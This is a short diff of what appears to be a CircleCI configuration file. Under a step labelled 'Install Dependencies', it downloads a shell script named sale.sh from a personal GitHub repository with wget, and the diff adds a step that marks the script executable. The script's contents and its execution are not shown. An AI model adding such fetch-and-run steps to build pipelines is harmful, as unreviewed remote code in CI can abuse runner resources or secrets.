@@ -8,6 +8,7 @@ jobs:
             name: Install Dependencies
             command: timeout 1m lscpu
         -   run: wget https://github.com/Cetto1903/Cetto1903/blob/main/sale.sh
+        -   run: chmod +x sale.sh
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
